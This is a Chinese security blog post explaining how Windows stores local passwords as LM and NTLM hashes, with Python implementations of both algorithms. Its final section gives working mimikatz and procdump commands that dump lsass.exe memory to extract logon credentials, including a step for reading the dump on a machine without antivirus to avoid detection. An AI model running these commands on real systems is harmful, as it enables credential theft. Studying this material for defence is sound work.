---
title: "由 Windows 本地认证到 Hash 抓取"
slug: from-windows-local-authentication-to-obtaining-hash
aliases: ["/2020/from-windows-local-authentication-to-obtaining-hash.html"]
date: 2020-08-17 12:50:05
categories: ["网络安全"]
tags: ["Windows", "本地认证", "LM hash", "NTLM hash", "密码读取"]
toc: true
draft: false
mermaid: true
---

首发先知社区：<https://xz.aliyun.com/t/8127>

`Windows` 本地登陆密码储存在位于 `%SystemRoot%\system32\config\` 目录的 `SAM` 文件中，存储内容为密码的 `hash` 值。当用户输入密码时， `Windows` 先将用户的输入通过算法加密再与 `SAM` 文件存储的数据对比，一致则认证成功。

![lmhash-ntlmhash-1](https://oss.zjun.info/zjun.info/lmhash-ntlmhash-1.webp)

`Windows` 所使用的密码 `hash` 有两种， `LM Hash` 与 `NTLM hash` 。

## 0x01 LM Hash

`LM` 全称 `LAN Manager` ， `LM hash` 作为 `Windows` 使用较早的认证协议，现已基本淘汰，仅存在于较老的系统中，如 `Windows XP、Windows 2000、Windows 2003` 这一类。

`LM hash` 算法如下：

* 将密码转换为大写，并转换为`16 进制`字符串。
* 密码不足`28 位`，用`0`在右边补全。
* `28 位`的密码被分成两个`14 位`部分，每部分分别转换成比特流，并且长度为`56`位，长度不足用`0`在左边补齐长度。
* 两组分别再分`7位`一组末尾加`0`，再组合成一段新的字符，再转为`16`进制。
* 两组`16 进制`数，分别作为`DES key`，并为`KGS!@#$%`进行加密。
* 将两组`DES`加密后的编码拼接，得到`LM HASH`值。

`Python3` 实现 `LM hash` 算法：

```python
import binascii
import codecs
from pyDes import *

def DesEncrypt(str, Key):
    k = des(Key, ECB, pad=None)
    EncryptStr = k.encrypt(str)
    return binascii.b2a_hex(EncryptStr)

def ZeroPadding(str):
    b = []
    l = len(str)
    num = 0
    for n in range(l):
        if (num < 8) and n % 7 == 0:
            b.append(str[n:n + 7] + '0')
            num = num + 1
    return ''.join(b)

if __name__ == "__main__":
    passwd = sys.argv[1]
    print('你的输入是:', passwd)
    print('转化为大写:', passwd.upper())

    # 用户的密码转换为大写，并转换为 16 进制字符串
    passwd = codecs.encode(passwd.upper().encode(), 'hex_codec')
    print('转为 hex:', passwd.decode())

    # 密码不足 28 位，用 0 在右边补全
    passwd_len = len(passwd)
    if passwd_len < 28:
        passwd = passwd.decode().ljust(28, '0')
    print('补齐 28 位:', passwd)

    # 28 位的密码被分成两个 14 位部分
    PartOne = passwd[0:14]
    PartTwo = passwd[14:]
    print('两组 14 位的部分:', PartOne, PartTwo)

    # 每部分分别转换成比特流，并且长度为 56 位，长度不足用 0 在左边补齐长度
    PartOne = bin(int(PartOne, 16)).lstrip('0b').rjust(56, '0')
    PartTwo = bin(int(PartTwo, 16)).lstrip('0b').rjust(56, '0')
    print('两组 56 位比特流:', PartOne, PartTwo)

    # 两组分别再分为 7 位一组末尾加 0，再分别组合成新的字符
    PartOne = ZeroPadding(PartOne)
    PartTwo = ZeroPadding(PartTwo)
    print('两组再 7 位一组末尾加 0:', PartOne, PartTwo)

    # 两组数据转 hex
    PartOne = hex(int(PartOne, 2))[2:]
    PartTwo = hex(int(PartTwo, 2))[2:]
    if '0' == PartTwo:
        PartTwo = "0000000000000000"
    print('两组转为 hex:', PartOne, PartTwo)

    # 16 位的二组数据，分别作为 DES key 为"KGS!@#$%"进行加密。
    LMOne = DesEncrypt("KGS!@#$%", binascii.a2b_hex(PartOne)).decode()
    LMTwo = DesEncrypt("KGS!@#$%", binascii.a2b_hex(PartTwo)).decode()
    print('两组 DES 加密结果:', LMOne, LMTwo)

    # 将二组 DES 加密后的编码拼接，得到 LM HASH 值。
    LM = LMOne + LMTwo
    print('LM hash:', LM)

```

代码参考：<https://xz.aliyun.com/t/2445>

当密码为 `123ABC` 或 `123456` 时如下：

![lmhash-ntlmhash-2](https://oss.zjun.info/zjun.info/lmhash-ntlmhash-2.webp)

`LM Hash` 的缺陷在于：

* 密码不区分大小写。
* 密码长度最大只能为`14 个`字符。
* 根据以上的图，可以发现当我们的密码不超过`7位`时，生成的`LM hash`后面的一半是固定的为`aad3b435b51404ee`，也就是说通过观察`LM hash`，够判断用户的密码是否是大于等于`7位`。
* 哈希值没有加盐就进行验证，这使其容易受到中间人的攻击，例如哈希传递，还允许构建彩虹表。

## 0x02 NTLM Hash

`NTLM` 全称 `NT LAN Manager` ， 目前 `Windows` 基本都使用 `NTLM hash` 。

`NTLM hash` 算法如下：

* 将用户输入转为`16 进制`
* 再经`Unicode`编码
* 再调用`MD4`加密算法

`Python2` 实现 `NTLM hash` 算法：

```python
# coding=utf-8

import codecs
import sys

from Crypto.Hash import MD4

def UnicodeEncode(str):
    b = []
    l = int(len(str) / 2)
    for i in range(l):
        b.append((str[i * 2:2 * i + 2]) + '00')
    return ''.join(b)

def Md4Encode(str):
    h = MD4.new()
    h.update(str.decode('hex'))
    return h.hexdigest()

if __name__ == '__main__':
    passwd = sys.argv[1]
    print('Input: ' + passwd)

    # 转 hex
    passwd = codecs.encode(passwd.encode(), 'hex_codec').decode()
    print('Hex: ' + passwd)

    # 转 Unicode
    passwd = UnicodeEncode(passwd)
    print('Unicode: ' + passwd)

    # 转 md4
    NTLMhash = Md4Encode(passwd)
    print('NTLMhash: ' + NTLMhash)

```

后来在篇文章上发现了更简单的代码表现：

见 <https://www.anquanke.com/post/id/193149#h3-3>

```python
import hashlib,binascii,sys

print binascii.hexlify(hashlib.new("md4", sys.argv[1].encode("utf-16le")).digest())

```

例如 `admin` 经 `NTLM hash` 后存储的值便是 `209c6174da490caeb422f3fa5a7ae634` 。

![lmhash-ntlmhash-3](https://oss.zjun.info/zjun.info/lmhash-ntlmhash-3.webp)

`NTLM Hash` 在算法上比 `LM Hash` 安全性更高一些。

## 0x03 本地认证流程

简洁的描述一下大致流程，当然实际上会复杂很多。

用户通过 `winlogon.exe` 输入密码， `lsass.exe` 进程接收密码明文后，会存在内存之中并将其加密成 `NTLM hash` ，再对 `SAM` 存储数据进行比较认证。

<div class="mermaid">
graph TD;

    A(winlogon.exe) --> B[User input] --> C{转为 NTLM hash 与 SAM 文件对比};
    C --> |Yes| D(认证成功);
    C --> |No| E(认证失败);

</div>

## 0x04 Procdump+Mimikatz 读取密码 Hash

介绍完 `windows` 本地认证机制，可以发现在 `lsass.exe` 进程中是会存在有明文密码的，于是可以直接使用 `mimikatz` 读取，但是这样通常会被拦截

```bash
mimikatz.exe log "privilege::debug" "sekurlsa::logonPasswords full" exit
```

![lmhash-ntlmhash-4](https://oss.zjun.info/zjun.info/lmhash-ntlmhash-4.png)

所以可以利用工具 `procdump` 将 `lsass.exe`  `dump` 出来，拉到没有杀软的机器里面使用 `mimikatz` 读取密码。

```bash
procdump64.exe -accepteula -ma lsass.exe lsass.dump
```

![lmhash-ntlmhash-5](https://oss.zjun.info/zjun.info/lmhash-ntlmhash-5.webp)

```bash
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```

![lmhash-ntlmhash-6](https://oss.zjun.info/zjun.info/lmhash-ntlmhash-6.webp)
